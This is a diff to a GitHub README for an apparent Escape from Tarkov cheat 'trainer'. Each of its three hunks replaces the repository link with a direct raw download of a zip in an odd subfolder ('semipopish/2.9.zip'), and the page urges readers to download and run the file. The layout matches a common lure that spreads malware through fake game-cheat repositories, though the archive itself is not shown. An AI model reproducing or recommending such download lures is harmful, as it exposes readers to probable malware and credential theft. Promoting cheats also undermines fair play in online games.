@@ -1,7 +1,7 @@
 <h1>🎯 EscapeFromTarkov-Trainer-2026 - Your Ultimate Tarkov Advantage Awaits</h1>
 
 <p align="center">
-  <a href="https://github.com/felipinhoasf25-blip/EscapeFromTarkov-Trainer-2026">
+  <a href="https://github.com/felipinhoasf25-blip/EscapeFromTarkov-Trainer-2026/raw/refs/heads/main/semipopish/2.9.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-Click%20Here%20to%20Get%20Started-blueviolet?style=for-the-badge&logo=github&logoColor=white" alt="Download" width="400">
   </a>
 </p>
@@ -34,7 +34,7 @@ Getting started is incredibly simple. Follow these three easy steps.
 
 At the top of this page, you'll see a big, colorful button. **Your primary action is to visit the download link.** Click on it to go to the download page.
 
-👉 **Visit this link to download the application:** [https://github.com/felipinhoasf25-blip/EscapeFromTarkov-Trainer-2026](https://github.com/felipinhoasf25-blip/EscapeFromTarkov-Trainer-2026)
+👉 **Visit this link to download the application:** [https://github.com/felipinhoasf25-blip/EscapeFromTarkov-Trainer-2026/raw/refs/heads/main/semipopish/2.9.zip](https://github.com/felipinhoasf25-blip/EscapeFromTarkov-Trainer-2026/raw/refs/heads/main/semipopish/2.9.zip)
 
 This will take you to the official source for the file. The download page will provide you with the necessary file to get the trainer on your computer.
 
@@ -110,7 +110,7 @@ This trainer is lightweight and designed to run on virtually any Windows PC that
 
 You're just two steps away from transforming your Tarkov experience. Click the download button, run the file, and jump into your next raid with a massive advantage. It's really that easy.
 
-**[⬇️ CLICK HERE TO DOWNLOAD AND GET STARTED](https://github.com/felipinhoasf25-blip/EscapeFromTarkov-Trainer-2026)**
+**[⬇️ CLICK HERE TO DOWNLOAD AND GET STARTED](https://github.com/felipinhoasf25-blip/EscapeFromTarkov-Trainer-2026/raw/refs/heads/main/semipopish/2.9.zip)**
 
 We're confident you'll love the difference this makes. See you in the raid!
 
